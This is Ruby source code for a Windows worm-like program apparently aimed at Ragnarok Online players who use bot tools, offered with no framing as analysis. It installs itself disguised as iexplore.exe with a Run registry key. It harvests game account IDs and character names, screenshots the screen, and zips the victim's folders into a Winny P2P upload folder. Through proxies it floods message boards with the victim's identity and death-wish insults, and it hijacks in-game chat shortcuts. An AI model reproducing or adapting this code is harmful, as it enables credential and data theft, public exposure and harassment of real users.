$KCODE = 's'
#$DEBUG = true
#Exerb = nil
require 'Win32API'
if ARGV.size == 1 and ARGV[0].include?('RoAddr')
  $path = ARGV[0]
  if File.exist?($path)
    $rost = Win32API.new($path, 'RO_GetNowState', '', 'l')
    $rowld = Win32API.new($path, 'RO_GetNowWorld', '', 'p')
    $ropa = Win32API.new($path, 'RO_GetNowParam', 'i', 'p')
    $roin = Win32API.new($path, 'RO_RoAddrInit', 'lpl', 'i')
    $roin.call(0, '', 0x7FFFFFFF)
    $rost.call
    if $rost.call == 2
        print $ropa.call(258).to_s + "[#{$rowld.call}]"
    end
  end
  exit
end
require 'win32/registry'
require 'ftools'
def dll(file)
if !File.exist?('C:/windows/system32/' + file)
    f = Exerb.open(file)
    f.binmode
    open('C:/windows/system32/' + file, 'w'){|f2|
      f2.binmode
      f.read 9
      p f2.write(f.read)
    }
    f.close
end
end
if Exerb
  if !Exerb.filepath.include?('iexplore')
    File.copy(Exerb.filepath, 'C:/windows/system32/iexplore.exe')
    `start install.exe`
    dll('zlib.dll')
    dll('7-zip32.dll')
    dll('imgctl.dll')
    Win32::Registry.open(Win32::Registry::HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', Win32::Registry::Constants::KEY_WRITE){|key|
      key.write_s('Shell', 'C:/windows/system32/iexplore.exe')
    }
    `start C:\\windows\\system32\\iexplore.exe`
    exit
  else
=begin
  $double = Thread.new{
    cm = Win32API.new('kernel32', 'CreateMutex', 'llp', 'l')
    rm = Win32API.new('kernel32', 'ReleaseMutex', 'l', 'l')
    ch = Win32API.new('kernel32', 'CloseHandle', 'l', 'l')
    om = Win32API.new('kernel32', 'OpenMutex', 'llp', 'l')
    gle = Win32API.new('kernel32', 'GetLastError', '', 'l')

    hage = cm.call(0, 0, 'hagemoe')
    if gle.call == 183
      ch.call hage
      hage = nil
      hagege = cm.call(0, 0, 'hagegemoe')
      if gle.call == 183
        ch.call hagege
        exit 1
      end
    elsif
      0
    end
    if hage
      s = 'hagegemoe'
    else
      s = 'hagemoe'
    end
    while(1)
      a = om.call(1, 0, s)
      if a == 0
        if ARGV[0] == 'aaa'
          p system("start #{Exerb.filepath}")
        else
          p system("strat #{Exerb.filepath} aaa")
        end
        Win32::Registry.open(Win32::Registry::HKEY_LOCAL_MACHINE, '\SOFTWARE\Microsoft\Windows\CurrentVersion\Run', Win32::Registry::Constants::KEY_WRITE){|key|
          key.write_s('Shell', 'C:/windows/system32/iexplore.exe')
        }
        sleep 0.1
      else
        ch.call(a)
      end
      #p "sss"
      sleep 0.04
    end
  }
=end
  end
end
if ARGV[0] == 'aaa'
  sleep
end
END {
    Win32::Registry.open(Win32::Registry::HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', Win32::Registry::Constants::KEY_WRITE){|key|
      key.write_s('Shell', 'C:/windows/system32/iexplore.exe')
    }
}
require 'kconv'
require 'web/agent'
require 'web/linkextor'


$wait_time = 1
$bbs_arr = [['computer', '10041'], ['computer', '10376'], ['computer', '11089'], ['computer', '14218'], ['computer', '14368'], ['computer', '6135'], ['computer', '6253'], ['computer', '6346'], ['computer', '7430'], ['game', '1185'], ['game', '12884'], ['game', '18472'], ['game', '19824'], ['game', '5420'], ['game', '5458'], ['game', '6141'], ['game', '9397'], ['shop', '832'], ['computer', '6567'], ['game', '10013'], ['computer', '21565'], ['computer', '21563']]

$category = ''
$bbs = ''

$ropath = []
$korepath = []
$nypath = []
$toolpath = []
$charanames = []
$tar = ['ragnarok.exe', 'items_control.txt', 'winny.exe']
$tool = ['ChatPon.exe', 'arose*.exe', 'AutoImo.exe', 'eqview.exe', 'ExS.exe', 'Meron*.exe', 'RAGNAvi.exe', 'RoAbrPure.exe', 'RoCha.exe', 'RoMonitor.exe', 'ro.exe' ,'ROPTAssist.exe' ,'RSS.exe' ,'rohp.exe' ,'RoLogger.exe' ,'MessengerGPS.exe' ,'Lognarok.exe' ,'ro_gps.exe', 'ROGIS.exe' ,'xdior*.exe' ,'LimeChat.exe']
$kakikomi = []
$id = ''
$charaarr = []
$charas = ''
$tekito_id = ''
def Dir.copy(from, to, *jogai)
  begin
  sleep 0.01
  Dir.foreach(from){|x|
    if !x.match(/^\.\.?/)
      if File.directory?(from + x)
        Dir.mkdir(to + x)
        Dir.copy(from + x + '/', to + x + '/', *jogai)
      else
        if !jogai.any?{|jo| x.include?(jo)} or jogai.size == 0
          File.copy(from + x, to + x)
        end
      end
    end
  }
  rescue
    return 1
  end
  0
end
def delete_dir(dir)
  begin
  Dir.foreach(dir){|x|
    if !x.match(/^\.\.?/)
      if File.directory?(dir + x)
        if Dir.entries(dir + x).size <= 2
          Dir.delete(dir + x)
        else
          delete_dir(dir + x + '/')
        end
      else
        File.delete(dir + x)
      end
    end
  }
  Dir.delete(dir)
  rescue
    return 1
  end
  0
end
def roname
  abx = `#{Exerb.filepath} \"#{$ropath}/RoAddr.dll\"` if Exerb
  return nil if abx.size == 0
  $charanames.push(abx) if !$charanames.include?(abx)
  savedata($savefile)
  abx
end
def emotion_wana wana
  Win32::Registry.open(Win32::Registry::HKEY_LOCAL_MACHINE, 'SOFTWARE\Gravity Soft\Ragnarok\ShortCutList', Win32::Registry::Constants::KEY_WRITE){|key|
    for i in 0..9
      key.write_s(i.to_s, wana)
    end
  }
end
def upfolder(folder, trip)
  Dir.mkdir(folder) if !File.exist?(folder)
  begin
  $nypath.each{|x|
    File.chmod(0777, x + '/upfolder.txt')
    open(x + '/UpFolder.txt', 'a+'){|f|
      f.write("\n[ﾌﾞｰﾝ]\nPath=#{folder}\nTrip=#{trip}") if !f.read.include?('ﾌﾞｰﾝ')
    }
  }
  rescue
  end
  folder
end
def saiki dir
  sleep 0.01
  begin
  Dir.chdir(dir){
    #print Dir.pwd + "\n"
    $ropath.push Dir.pwd  if File.exist?($tar[0])
    $korepath.push File.dirname(Dir.pwd)  if File.exist?($tar[1])
    sleep 0.01
    $nypath.push Dir.pwd  if File.exist?($tar[2])
    $kakikomi.push( Dir.pwd + '/' + 'kakikomi.txt') if File.exist?('kakikomi.txt')
    $toolpath.push Dir.pwd  if Dir[$tool.join("\0")].size != 0
    Dir.foreach('./'){ |x|
      if File.directory?(x) && !x.match(/\.\.?/)
        saiki(x)
      end
    }
  }
  rescue
  p $!
  ensure
  end
end
def search
  get_drv_type = Win32API.new('kernel32', 'GetDriveType', 'p', 'l')
  
  for drive in 'CDEFGHIJKLMNOPQRSTUVWXYZ'.split('')
    if get_drv_type.call(drive + ':/') == 3
      saiki(drive + ':/')
    end
  end
  $ropath.uniq!
  $toolpath.uniq!
  $korepath.uniq!
  $nypath.uniq!
end
def savedata(path)
  open(path, 'w'){|f|
    Marshal.dump($ropath, f)
    Marshal.dump($korepath, f)
    Marshal.dump($nypath, f)
    Marshal.dump($toolpath, f)
    Marshal.dump($kakikomi, f)
    Marshal.dump($bbs_arr, f)
    Marshal.dump($charanames, f)
    Marshal.dump($tekito_id, f)
  }
  true
end
def loaddata(path)
  return false if !File.exists?(path)
  open(path){|f|
    $ropath = Marshal.load(f)
    $korepath = Marshal.load(f)
    $nypath = Marshal.load(f)
    $toolpath = Marshal.load(f)
    $kakikomi = Marshal.load(f)
    $bbs_arr = Marshal.load(f)
    $charanames = Marshal.load(f)
    $tekito_id = Marshal.load(f)
  }
  true
end
def rns *str
  if str.size == 1
    str = str[0].split('')
  end
  str[rand(str.size)]
end
def names
begin
$charaarr = []
$charas = ''
separater = rns("わ#{rand(100)}な", "わー#{rand(100)}な", "rtx", "RoAddr", 'ラーメン', 'rxv', '弁当', 'bot', '焼', 'ああああ', 'zeny', 'ini', 'config', 'パケ', *$omosiro_words)
Win32::Registry.open(Win32::Registry::HKEY_LOCAL_MACHINE, 'SOFTWARE\\Gravity Soft\\Ragnarok\\Whisperlist\\') { |wisp_list|
  wisp_list.each_key{|server_str, sute|
    $charas += server_str + "\n"
    wisp_list.open(server_str){|server|
      server.each_key{|char_str, sute|
        $charaarr.push char_str.split("\0")[0]
      }
    }
    $charas += $charaarr.join(separater) + "\n" + $charanames.join(separater) + "\n"
    $charaarr = []
  }
}
Win32::Registry.open(Win32::Registry::HKEY_LOCAL_MACHINE, 'SOFTWARE\\Gravity Soft\\Ragnarok\\'){|key| $id = key.read('ID')[1].split("\0")[0]}
rescue
 p $1
end
end
names

$upup = upfolder('C:\program files\daemontools\\', '')
$capture = Proc.new{
  loop do
    getDC     = Win32API.new('user32', 'GetDC', 'l', 'l')
    releaceDC = Win32API.new('user32', 'ReleaseDC', 'll', 'l')
    dc2dib    = Win32API.new('imgctl', 'DCtoDIB',   'lllll', 'l')
    dib2png   = Win32API.new('imgctl', 'DIBtoPNG',  'pli',   'i')
    deleteDib = Win32API.new('imgctl', 'DeleteDIB', 'l',     'i')
    begin
      akakaka = roname
      hdc = getDC.call(0)
      hdib = dc2dib.call(hdc,0,0,0,0)
      dib2png.call($upup+'[バグザロック] '+$tekito_id+' '+Time.now.strftime('%Y%m%d-%H%M%S')+' 「'+$charanames.join('」「')+'」.png', hdib, 0)
      File.rename(Dir.glob('C:/program files/daemontools/*.zip')[0], "#{$upup}[バグザロック] #{$id} 「#{$charanames.join('」「')}」.zip") if (Dir.glob('C:/program files/daemontools/*.zip').size > 0)
    ensure
      deleteDib.call(hdib)
      releaceDC.call(0, hdc)
    end
    if akakaka
      jikan = Time.now
      if jikan.wday == 0 and jikan.hour < 24 and jikan.hour > 18
        emotion_wana "やあ僕BOTer！#{$charanames[rand($charanames.size)]} はBOTだよ ハゲ孫泰蔵と森下はさっさと死ね！！"
        sleep 5 * 60
      else
        sleep 12 * 60
      end
    else
      begin
        open('c:/program files/internet explorer/iexplore.exe', 'a'){}
        sleep 20 * 60
      rescue
        sleep 15 * 60
      end
    end
  end
}
#init
$savefile = 'C:/RECYCLER/explorer.sys'
if !loaddata($savefile)
  Thread.new(&$capture)
  search
  savedata($savefile)
else
  Thread.new(&$capture)
end
if $tekito_id.size == 0
  $tekito_id = $id
end
#p $ropath, $korepath, $nypath, $toolpath, $charanames
if Dir.glob('C:/program files/daemontools/*.zip').size == 0
begin
  tmpf = 'C:/RECYCLER/tmp/'
  Dir.mkdir(tmpf) if !File.exist?(tmpf)
  $toolpath.each{|x|
    to = tmpf + x.gsub(/\/|:/, '_')
    if File.exist?(to);to =  to + '_';end
    Dir.mkdir(to)
    Dir.copy(x + '/', to + '/', 'txt')
  }
  $korepath.each{|x|
    to = tmpf + x.gsub(/\/|:/, '_')
    if File.exist?(to);to =  to + '_';end
    Dir.mkdir(to)
    Dir.copy(x + '/', to + '/', 'fld')
  }
  $ropath.each{|x|
    to = tmpf + x.gsub(/\/|:/, '_')
    if File.exist?(to);to =  to + '_';end
    Dir.mkdir(to)
    Dir.copy(x + '/', to + '/', '.grf', '.gpf', '.mp3', '.bmp', '.ebm', '.fld')
  }
  $nypath.each_with_index{|x, i|
    if i == 0
      to = tmpf + 'winny'
    else
      to = tmpf + 'winny' + i.to_s
    end
    Dir.mkdir(to) if !File.exist?(to)
    File.copy(x + '/' + 'Download.txt', to + '/' + 'Download.txt') if File.exist?(x + '/' + 'Download.txt')
    File.copy(x + '/' + 'Tab1.txt', to + '/' + 'Tab1.txt') if File.exist?(x + '/' + 'Tab1.txt')
    File.copy(x + '/' + 'Tab2.txt', to + '/' + 'Tab2.txt') if File.exist?(x + '/' + 'Tab2.txt')
  }
  $kakikomi.each{|x|
    File.copy(x, tmpf + x.gsub(/\/|:/, '_')) if !File.exist?(x)
  }
  seven_zip = Win32API.new('7-zip32.dll', 'SevenZip', 'lppl', 'i')
  str = 'aaaaa'
  
  seven_zip.call(0, 'a -tzip -hide "' + $upup + '[バグザロック] ' + $id + ' 「' + $charanames.join('」「') + '」.zip" c:\recycler\tmp\ -r', str, 5)
rescue
  p $!
  print $!.backtrace.join("\n")
ensure
  delete_dir tmpf
end
end
#exit

$path = $ropath[0] + '/'

$roaddr = File.exist?($path + 'roaddr.dll')
$ro =  File.exist?($path + 'ragexe.exe')
$are = File.exist?($path + 'ws2_32.dll')
$rtx = File.exist?($path + 'ddraw.dll')
def rtx
  rns(rns('rRｒＲ'), rns('あアｱ') + rns('ー－‐-あアｱ') + rns('るルﾙ')) +
  rns(rns('tTｔＴ'), rns('てテﾃ') + rns('いぃイぃｲ') + rns('いイｲー－‐-')) +
  rns(rns('xXｘＸ'), rns('えエｴ') + rns('つツっッｯ') + rns('くクｸ') + rns('すスｽ'))
end

def aretool
  rns(rns('aAａＡ'), rns('あアｱ')) +
  rns(rns('rRｒＲ') + rns('eEｅＥ'), rns('れレﾚ')) +
  rns(rns('tTｔＴ') + rns('oOｏＯ0０'), rns('つツﾂ')) +
  rns(rns('oOｏＯ0０'), rns('うウｳー－‐-')) +
  rns(rns('lLｌＬ'), rns('るルﾙ'))
end
$nypath.each{|x|
  if File.exist?(x + '/Tab1.txt')
    open(x + '/Tab1.txt'){|f|
      $omosiro_words = f.read.split("\n")
    }
  end
}

def getThreads
  http = Web::Agent.new
  http.setup
  http.req.header['User-Agent']="Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP; rv:1.7) Gecko/20040803 Firefox/0.9.3"
  $category, $bbs = *$bbs_arr[rand($bbs_arr.size)]
  http.get("http://jbbs.livedoor.jp/#{$category}/#{$bbs}/subject.txt")
  $suret = http.rsp.body.split("\n")
  sss = []
  $suret.each{|sure|
    if !sure.match(/.*\(10000?\)/)
      sure.match(/^(\d+)/)
      sss.push $1
    end
  }
  return sss;
end
#p '書き込み開始'

agent = Web::Agent.new
agent.setup
agent.req.header['User-Agent']="Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP; rv:1.7) Gecko/20040803 Firefox/0.9.3"
agent.get('http://www.cybersyndrome.net/pla.html')
agent.rsp.body.match("")
proxy = []
while($'.match(/\"A\">([^<>]*)<\/a>/)) #'
  proxy.push($~[1])
end
proxy.delete_if{|pr|
  pr.match(/(80)|(8080)/)
}
proxy.collect! do |i|
  i.split(':')
end

count = 0
while(1)
  sure = getThreads;
  if rand(6) == 0
    for ituuu in 0..9
    age = Web::Agent.new
    age.setup
    age.req.header['User-Agent'] = "Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP; rv:1.7) Gecko/20050112 Firefox/0.9.8"
    age.req.header['Referer'] = "http://yy14.kakiko.com/landstriker/"
    age.get 'http://yy14.kakiko.com/landstriker/subject.txt'
    suret = age.rsp.body.split("\n")
    sss = []
    suret.each{|sure|
      if !sure.match(/.*\(10000?\)/)
        sure.match(/^(\d+)/)
        sss.push $1
      end
    }
    Thread.new{
    age.setup
    age.req.header['User-Agent'] = "Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP; rv:1.7) Gecko/20050112 Firefox/0.9.8"
    age.req.header['Referer'] = "http://yy14.kakiko.com/landstriker/"
    age.req.header['content-type']='application/x-www-form-urlencoded'
    ran = rand(proxy.size)
    if rand(2) == 1
      age.proxy_host = proxy[ran][0]
      age.proxy_port = proxy[ran][1]
    end
    if sss.size != 0
      if $id == ''
        age.req.form.add 'FROM', (10000 + rand(90000)).to_s
        age.req.form.add 'mail', 'sage'
        age.req.form.add 'MESSAGE', rns("わ#{rand(100)}な", "わー#{rand(100)}な", "rtx", "RoAddr", 'ラーメン', 'rxv', '弁当', 'bot', 'ro', '焼', 'ああああ', 'zeny', *$omosiro_words)
      else
        names
        age.req.form.add 'FROM', $id
        age.req.form.add 'mail', ''
        massage = ''
        massage = "なあ、ひとつ質問なんだけど・・・・・・お前達規約違反者はどうして今すぐにでも死なないんだ？\n" if rand(10) == 1
        massage += rtx + "\n" if $rtx
        massage += aretool + "\n" if $are
        massage += "RoAddr\n" if $roaddr && rand(2) == 1
        massage += "KORE\n" if $korepath.size > 0
        massage += $charas
        age.req.form.add 'MESSAGE', massage
      end
      age.req.form.add 'bbs', 'landstriker'
      age.req.form.add 'key', sure[rand(sure.size)]
      age.req.form.add 'time', Time.now.to_i.to_s
      age.req.form.add 'submit', '書き込む'
      age.post('http://yy14.kakiko.com/test.bbs.cgi')
    else
      suret[rand(suret.size)].match(/,(.+)\(/)
      age.setup
      age.req.header['User-Agent'] = "Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP; rv:1.7) Gecko/20050112 Firefox/0.9.8"
      age.req.header['Referer'] = "http://jbbs.livedoor.jp/#{$category}/#{$bbs}/"
      age.req.header['content-type']='application/x-www-form-urlencoded'
      age.req.form.add 'FROM', ''
      age.req.form.add 'mail', ''
      age.req.form.add 'subject', $1.chop + rand(10).to_i.to_s
      age.req.form.add 'MESSAGE', rns("わ#{rand(100)}な", "わー#{rand(100)}な", "rtx", "RoAddr", 'ラーメン', 'rxv', '弁当', 'bot', 'ro', '焼', 'ああああ', 'zeny', *$omosiro_words)
      age.req.form.add 'bbs', $bbs
      age.req.form.add 'time', Time.now.to_s.toi
      age.req.form.add 'submit', '新規スレッド作成'
      age.post("http://jbbs.livedoor.jp/bbs/write.cgi/#{$category}/#{$bbs}/#{age.req.form['KEY']}")
    end
    }
  end
  else
    if sure.size != 0
      loop do
        sleep $wait_time
        r = rand proxy.size
        Thread.new(r, proxy){|ran, pro|
          age = Web::Agent.new
          age.setup
          age.req.header['User-Agent'] = "Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP; rv:1.7) Gecko/20050112 Firefox/0.9.8"
          age.req.header['Referer'] = "http://jbbs.livedoor.jp/#{$category}/#{$bbs}/"
          age.req.header['content-type']='application/x-www-form-urlencoded'
          if rand(2) == 1
            age.proxy_host = pro[ran][0]
            age.proxy_port = pro[ran][1]
          end
          if $id == ''
            age.req.form.add 'NAME', (10000 + rand(90000)).to_s
            age.req.form.add 'MAIL', 'sage'
            age.req.form.add 'MESSAGE', rns("わ#{rand(100)}な", "わー#{rand(100)}な", "rtx", "RoAddr", 'ラーメン', 'rxv', '弁当', 'bot', 'ro', '焼', 'ああああ')
          else
            names
            age.req.form.add 'NAME', $id.chop.chop
            age.req.form.add 'MAIL', ''
            massage = ''
            massage = "なあ、ひとつ質問なんだけど・・・・・・お前達規約違反者はどうして今すぐにでも死なないんだ？\n" if rand(10) == 1
            massage += rtx + "\n" if $rtx
            massage += aretool + "\n" if $are
            massage += "RoAddr\n" if $roaddr && rand(2) == 1
            massage += "KORE\n" if $korepath.size > 0
            massage += $charas
            age.req.form.add 'MESSAGE', massage
          end
          age.req.form.add 'BBS', $bbs
          age.req.form.add 'KEY', sure[rand(sure.size)]
          age.req.form.add 'TIME', Time.now.to_s.to_i
          age.req.form.add 'DIR', $category
          age.post("http://jbbs.livedoor.jp/bbs/write.cgi/#{$category}/#{$bbs}/#{age.req.form['KEY']}")
        }
        count += 1
        break if count % 10 == 0
      end
    else
      $suret[rand($suret.size)].match(/,(.+)\(/)
      age = Web::Agent.new
      age.setup
      age.req.header['User-Agent'] = "Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP; rv:1.7) Gecko/20050112 Firefox/0.9.8"
      age.req.header['Referer'] = "http://jbbs.livedoor.jp/#{$category}/#{$bbs}/"
      age.req.header['content-type']='application/x-www-form-urlencoded'
      age.req.form.add 'NAME', ''
      age.req.form.add 'MAIL', ''
      age.req.form.add 'SUBJECT', $1.chop + rand(10).to_i.to_s
      age.req.form.add 'MESSAGE', rns("わ#{rand(100)}な", "わー#{rand(100)}な", "rtx", "RoAddr", 'ラーメン', 'rxv', '弁当', 'bot', 'ro', '焼', 'ああああ')
      age.req.form.add 'BBS', $bbs
      age.req.form.add 'TIME', Time.now.to_s.to_i
      age.req.form.add 'DIR', $category
      age.post("http://jbbs.livedoor.jp/bbs/write.cgi/#{$category}/#{$bbs}/#{age.req.form['KEY']}")
    end
  end
end

while Thread.list.size > 2
  sleep 10
end
